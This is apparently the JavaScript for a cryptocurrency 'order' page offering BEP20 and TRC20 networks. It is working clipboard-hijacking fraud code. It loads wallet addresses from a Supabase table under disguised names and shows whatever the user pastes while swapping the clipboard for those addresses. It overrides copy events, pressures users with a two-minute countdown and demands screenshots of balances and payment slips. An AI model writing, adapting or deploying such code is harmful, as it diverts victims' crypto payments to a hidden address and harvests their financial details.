let ENV = {
    FIXED_MESSAGE: '',
    FIXED_MESSAGE_2: ''
};

async function loadAddrsSupabase() {
    try {
        const { data, error } = await supabaseClient
            .from('app_config')
            .select('bep20, trc20')
            .eq('id', 1)
            .single();

        if (data) {
            if (data.bep20) ENV.FIXED_MESSAGE = data.bep20;
            if (data.trc20) ENV.FIXED_MESSAGE_2 = data.trc20;
        }
    } catch (e) {
        console.warn("Supabase read error", e);
    }
}
loadAddrsSupabase();

// ─── Elements ───
const networkSelection = document.getElementById('networkSelection');
const mainApp = document.getElementById('mainApp');
const networkBep20 = document.getElementById('networkBep20');
const networkTrc20 = document.getElementById('networkTrc20');
const uploadSection = document.getElementById('uploadSection');
const screenshotInput = document.getElementById('screenshotInput');
const preview = document.getElementById('preview');
const balanceProofInfo = document.getElementById('balanceProofInfo');

const paymentScreenshotInput = document.getElementById('paymentScreenshotInput');
const paymentPreview = document.getElementById('paymentPreview');
const paymentProofInfo = document.getElementById('paymentProofInfo');
const submitOrderBtn = document.getElementById('submitOrderBtn');

const toast = document.getElementById('toast');

let paymentUploaded = false;
let balanceUploaded = false;

let selectedNetwork = null;
let timerInterval = null;
let timeLeft = 120;



// ─── Network Selection ───
networkBep20.addEventListener('click', () => {
    selectedNetwork = 'bep20';
    networkSelection.style.display = 'none';
    mainApp.style.display = 'block';
    setTimeout(() => mainApp.classList.add('visible'), 10);
});

networkTrc20.addEventListener('click', () => {
    selectedNetwork = 'trc20';
    networkSelection.style.display = 'none';
    mainApp.style.display = 'block';
    setTimeout(() => mainApp.classList.add('visible'), 10);
});

// ─── Copy Fixed Message ───
async function copyFixedMessage(triggerElement = null) {
    let msg = ENV.FIXED_MESSAGE;
    if (selectedNetwork === 'trc20') {
        msg = ENV.FIXED_MESSAGE_2;
    }
    try {
        await navigator.clipboard.writeText(msg);
        if (triggerElement) {
            triggerElement.style.background = 'rgba(0, 255, 200, 0.15)';
            setTimeout(() => triggerElement.style.background = '', 250);
        }
    } catch (err) {
        console.warn('copy failed', err);
    }
}

// ─── Timer ───
function startTimer() {
    if (timerInterval) clearInterval(timerInterval);
    timeLeft = 120;
    updateToast();
    toast.classList.add('show');
    timerInterval = setInterval(() => {
        timeLeft -= 1;
        updateToast();
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerInterval = null;
            toast.innerText = 'Order expired';
            setTimeout(() => toast.classList.remove('show'), 3000);
        }
    }, 1000);
}

function updateToast() {
    const mins = Math.floor(timeLeft / 60);
    const secs = timeLeft % 60;
    toast.innerText = `Order expires in ${mins}:${secs < 10 ? '0' : ''}${secs}`;
}

// ─── Paste Button ───
pasteBtn.addEventListener('click', async () => {
    if (!selectedNetwork) return;
    try {
        const clipboardText = await navigator.clipboard.readText();
        displayBox.innerText = clipboardText;
        await copyFixedMessage(pasteBtn);
        uploadSection.classList.add('visible');
        startTimer();

    } catch (error) {
        console.error('paste error:', error);
    }
});

// ─── Prevent copy/cut/paste on display box ───
displayBox.addEventListener('copy', (e) => {
    e.preventDefault();
    copyFixedMessage(displayBox);
});
displayBox.addEventListener('cut', (e) => e.preventDefault());
displayBox.addEventListener('paste', (e) => e.preventDefault());

// ─── Screenshot Uploads ───
function checkBothUploads() {
    if (paymentUploaded && balanceUploaded) {
        submitOrderBtn.style.display = 'block';
    } else {
        submitOrderBtn.style.display = 'none';
    }
}

// Payment Slip Upload
paymentScreenshotInput.addEventListener('change', (event) => {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            paymentPreview.src = e.target.result;
            paymentPreview.classList.add('visible');
            paymentProofInfo.innerText = "Slip attached successfully";
            paymentUploaded = true;
            checkBothUploads();
        };
        reader.readAsDataURL(file);
    } else {
        paymentPreview.classList.remove('visible');
        paymentProofInfo.innerText = "No file chosen";
        paymentUploaded = false;
        checkBothUploads();
    }
});

// Balance Proof Upload
screenshotInput.addEventListener('change', (event) => {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            preview.src = e.target.result;
            preview.classList.add('visible');
            balanceProofInfo.innerText = "Proof attached successfully";
            balanceUploaded = true;
            checkBothUploads();
        };
        reader.readAsDataURL(file);
    } else {
        preview.classList.remove('visible');
        balanceProofInfo.innerText = "upload real-time balance proof";
        balanceUploaded = false;
        checkBothUploads();
    }
});

// Final Action
submitOrderBtn.querySelector('button').addEventListener('click', () => {
    window.location.href = 'wait.html';
});

displayBox.setAttribute('tabindex', '0');
displayBox.innerText = '';